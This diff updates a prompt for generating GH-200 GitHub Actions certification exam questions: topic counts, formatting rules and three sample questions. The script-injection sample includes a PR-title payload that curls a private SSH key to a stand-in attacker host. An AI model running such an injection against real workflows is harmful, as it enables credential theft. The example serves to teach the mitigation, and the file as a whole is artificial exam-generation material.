@@ -6,6 +6,25 @@ This prompt guides generation of **400 high-quality exam-style questions** for t
 
 ---
 
+## Quick Reference
+
+| Parameter | Value |
+|-----------|-------|
+| **Total Questions** | 400 per iteration |
+| **Topics** | 19 |
+| **Difficulty Split** | 20% Easy / 60% Medium / 20% Hard |
+| **Answer Types** | 55% `one` / 26% `many` / 12% `all` / 7% `none` |
+| **Scenario-Based Minimum** | 70% (280+ questions) |
+| **Options Per Question** | 4 (5 for complex questions) |
+| **Security Minimum** | 45 questions (Topics 6, 7, 18) |
+| **Enterprise Minimum** | 36 questions (Topics 8, 14, 17) |
+| **Cross-Topic Minimum** | 20 questions |
+| **Output File** | `quiz\gh-200-iteration-[N].md` |
+| **Deduplication Source** | `quiz\gh-200.md` (if it exists) |
+| **Default Iteration** | 1 (increment to regenerate a different set) |
+
+---
+
 ## 1. Objective
 
 Generate 400 multiple-choice certification exam questions that follows `exam-overview.md` GH-200 exam skill domain breakdown and weights
@@ -61,17 +80,19 @@ All files located in: `github-actions\`
 
 ### Distribution by Topic (Recommended)
 
+> **Note**: Counts were recalibrated from an earlier draft that incorrectly summed to 420. These corrected values total exactly 400.
+
 | Topic # | Topic Name | Questions | Rationale |
 | ------- | ---------- | --------- | --------- |
 | 1 | VS Code Extension | 12 | Tools & features (foundational) |
-| 2 | Contextual Information | 26 | Core knowledge; 10 context types |
+| 2 | Contextual Information | 23 | Core knowledge; 10 context types |
 | 3 | Context Availability | 19 | Static vs. runtime; advanced concept |
-| 4 | Workflow File Structure | 30 | Fundamental; many properties to test |
-| 5 | Trigger Events | 30 | 26+ events; common exam focus |
-| 6 | Custom Env Vars | 22 | Practical, scenario-heavy |
+| 4 | Workflow File Structure | 27 | Fundamental; many properties to test |
+| 5 | Trigger Events | 27 | 26+ events; common exam focus |
+| 6 | Custom Env Vars | 21 | Practical, scenario-heavy |
 | 7 | Default Env Vars | 19 | Reference knowledge; practical use |
-| 8 | Environment Protection | 22 | Enterprise/security focus |
-| 9 | Artifacts | 26 | Practical; common workflows |
+| 8 | Environment Protection | 21 | Enterprise/security focus |
+| 9 | Artifacts | 23 | Practical; common workflows |
 | 10 | Caching | 22 | Performance optimization; strategy |
 | 11 | Workflow Sharing | 19 | Reusability; marketplace |
 | 12 | Debugging | 21 | Troubleshooting; real-world scenarios |
@@ -79,8 +100,8 @@ All files located in: `github-actions\`
 | 14 | Deployment Review | 15 | Enterprise/governance |
 | 15 | Creating/Publishing Actions | 21 | Advanced; marketplace |
 | 16 | Managing Runners | 21 | Operational; enterprise focus |
-| 17 | Enterprise Features | 26 | Policy, groups, audit; high exam weight |
-| 18 | Security & Optimization | 29 | OIDC, script injection, SHA pinning; critical |
+| 17 | Enterprise Features | 23 | Policy, groups, audit; high exam weight |
+| 18 | Security & Optimization | 26 | OIDC, script injection, SHA pinning; critical |
 | 19 | Troubleshooting | 21 | Problem-solving; real scenarios |
 | **TOTAL** | | **400** | |
 
@@ -177,6 +198,80 @@ Distribute answer types across the 400 questions:
 - **For `many` type**: Add **(Select all that apply)** after the question
 - **Avoid vague language**: "sometimes", "usually", "might" — be specific
 - **Double-check**: Question must be answerable from the guide alone
+- **YAML code blocks**: Format workflow snippets as fenced ` ```yaml ` blocks; keep them concise (5–15 lines); focus the snippet on the concept being tested
+
+---
+
+### Sample Questions (Illustrative Examples)
+
+The following examples demonstrate expected quality, format, and difficulty range.
+
+---
+
+#### Example 1 — Easy (`one`)
+
+**Difficulty**: Easy
+**Answer Type**: one
+**Topic**: Default Environment Variables (07)
+
+**Question**:
+Which default environment variable contains the GitHub REST API URL used by the current workflow run?
+
+- A) `GITHUB_SERVER_URL`
+- B) `GITHUB_API_URL`
+- C) `GITHUB_GRAPHQL_URL`
+- D) `GITHUB_TOKEN`
+
+**Answer**: B — `GITHUB_API_URL` holds the REST API base URL (e.g., `https://api.github.com`). `GITHUB_SERVER_URL` is the web UI URL, `GITHUB_GRAPHQL_URL` is the GraphQL endpoint, and `GITHUB_TOKEN` is a credential, not a URL.
+
+---
+
+#### Example 2 — Medium (`many`)
+
+**Difficulty**: Medium
+**Answer Type**: many
+**Topic**: Workflow Artifacts (09)
+
+**Scenario**:
+Your CI pipeline uploads test results and build binaries in a `build` job. A downstream `deploy` job downloads them. The deploy job intermittently reports that artifact downloads are empty or incomplete.
+
+**Question** (Select all that apply):
+Which actions would improve artifact reliability between jobs?
+
+- A) Add `if: always()` to the upload step so artifacts are uploaded even on failure
+- B) Pin `actions/upload-artifact` and `actions/download-artifact` to matching major versions
+- C) Set `retention-days: 90` to prevent early expiration during long-running pipelines
+- D) Replace `path: .` with a specific glob pattern targeting only required output files
+
+**Answer**: B, D — Pinning to matching versions prevents API compatibility issues; a precise glob avoids uploading unnecessary files that can cause partial or inconsistent downloads. `if: always()` aids debugging but does not fix reliability when the build itself fails. `retention-days` controls expiry, not mid-run consistency.
+
+---
+
+#### Example 3 — Hard (`one`)
+
+**Difficulty**: Hard
+**Answer Type**: one
+**Topic**: Security & Optimization — Script Injection (18)
+
+**Scenario**:
+A workflow step processes user-controlled PR titles:
+
+```yaml
+- name: Print PR title
+  run: echo "Processing PR: ${{ github.event.pull_request.title }}"
+```
+
+An attacker creates a PR titled: `valid title"; curl https://attacker.com/?d=$(cat ~/.ssh/id_rsa); echo "`
+
+**Question**:
+Which mitigation correctly prevents script injection without disabling the step?
+
+- A) Wrap the expression in single quotes: `echo 'PR: ${{ github.event.pull_request.title }}'`
+- B) Use `${{ toJson(github.event.pull_request.title) }}` to JSON-encode the value inline
+- C) Set the title as an environment variable and reference it as `$PR_TITLE` in the shell command
+- D) Add `permissions: read-all` to the job to restrict token scope
+
+**Answer**: C — Assigning the untrusted value to an environment variable (`PR_TITLE: ${{ github.event.pull_request.title }}`) and referencing `$PR_TITLE` in the shell prevents injection because the value is passed as data, never interpolated into the command string. A (single quotes) prevents variable expansion entirely. B (`toJson`) adds JSON encoding but does not prevent shell interpretation. D (permissions) limits the token scope but has no effect on command injection.
 
 ---
 
@@ -261,7 +356,7 @@ For each distractor, ask: *Would a candidate with 50% knowledge pick this?*
 - Environment protection rules: required reviewers, wait timers, custom rules
 - Deployment review workflows: pause, approve, monitor
 
-#### Minimum 36 questions on enterprise topics**
+#### Minimum 36 questions on enterprise topics
 
 ### Real-World Scenarios (Topics 5, 9–12, 19)
 
@@ -272,7 +367,7 @@ For each distractor, ask: *Would a candidate with 50% knowledge pick this?*
 - Debugging: log streaming, RUNNER_DEBUG, slow step identification
 - Troubleshooting: common errors, root cause, solutions
 
-#### Minimum 147 questions scenario-based**
+#### Minimum 147 questions scenario-based
 
 ### Advanced & Synthesis (All topics)
 
@@ -281,7 +376,7 @@ For each distractor, ask: *Would a candidate with 50% knowledge pick this?*
 - Optimization: "How can you reduce execution time?"
 - Error recovery: "An artifact upload fails midway; what happens?"
 
-#### Minimum 56 questions requiring synthesis/evaluation**
+#### Minimum 56 questions requiring synthesis/evaluation
 
 ---
 
@@ -328,6 +423,59 @@ For each distractor, ask: *Would a candidate with 50% knowledge pick this?*
 - **Use imperative mood**: "You need to..." not "One might..."
 - **Specify constraints**: "In a reusable workflow called by another workflow, which contexts are available?"
 - **Base on real scenarios**: "Your CI is slow; which caching strategy..."
+
+### YAML Code Blocks in Questions
+
+- **Minimum 30 questions** should include a relevant YAML workflow snippet
+- Keep code blocks to 5–15 lines; focus the snippet on the concept under test
+- Use ` ```yaml ` fenced blocks for all workflow fragments
+- Label snippets clearly: "workflow fragment", "job definition", or "step definition"
+- For error-identification questions, intentionally embed a subtle bug in the YAML; do not explain it in the scenario
+- Use realistic `runs-on`, action references (with SHA pins or version tags), and `env` / `with` blocks to reflect real-world patterns
+
+**Example snippet format**:
+
+```yaml
+jobs:
+  release:
+    runs-on: ubuntu-latest
+    environment: production
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - uses: actions/checkout@v4
+      - name: Configure AWS credentials
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: ${{ secrets.AWS_ROLE_ARN }}
+          aws-region: us-east-1
+```
+
+### Cross-Topic Synthesis Questions
+
+At least **20 questions** must combine concepts from two or more topic files. These reflect the real exam's synthesis challenge and cannot be answered by recalling a single section.
+
+**Recommended Topic Combinations**:
+
+| Topics | Example Focus |
+|--------|---------------|
+| 2 + 18 (Context + Security) | Which context expression leaks a secret value into workflow logs? |
+| 5 + 8 (Triggers + Environments) | Which trigger event bypasses environment protection rules? |
+| 9 + 10 (Artifacts + Caching) | When should you prefer a cache over an artifact for build output? |
+| 15 + 18 (Custom Actions + Security) | Which action reference strategy is safest for a third-party action? |
+| 16 + 17 (Runners + Enterprise) | How does a runner group restrict which workflows can use a self-hosted runner? |
+| 4 + 6 (Structure + Variables) | At which scope does this variable definition take precedence? |
+| 11 + 5 (Workflow Sharing + Triggers) | Which trigger event is unavailable when using a reusable workflow caller? |
+| 12 + 19 (Debugging + Troubleshooting) | Which debug technique identifies the specific step that introduced the timeout? |
+| 3 + 2 (Context Availability + Context Info) | Which context is only available at workflow level, not within a step? |
+| 18 + 7 (Security + Default Vars) | Which default variable must never be echoed to a public log? |
+
+**Tag cross-topic questions** in the template with all applicable topic numbers:
+
+```markdown
+**Topic**: Caching (10) + Artifacts (09) — Cross-Topic
+```
 
 ---
 
